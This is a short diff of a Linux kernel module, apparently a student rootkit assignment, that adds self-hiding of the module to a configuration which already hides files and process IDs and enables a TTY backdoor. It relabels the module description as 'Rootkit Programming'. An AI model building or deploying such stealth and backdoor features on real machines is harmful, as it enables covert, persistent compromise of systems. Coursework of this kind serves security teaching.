@@ -40,8 +40,9 @@ static struct file_operations g7_fops =
 
 
 rootkit_t rootkit = {
-    .hiding_files = true,
-    .hiding_pids  = true,
+    .hiding_module = true,
+    .hiding_files  = true,
+    .hiding_pids   = true,
     .backdoor = BD_TTY,
 };
 
@@ -116,7 +117,7 @@ g7_exit(void)
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Group 7");
-MODULE_DESCRIPTION("Assignment 3");
+MODULE_DESCRIPTION("Rootkit Programming");
 MODULE_INFO(intree, "Y");
 
 module_init(g7_init);
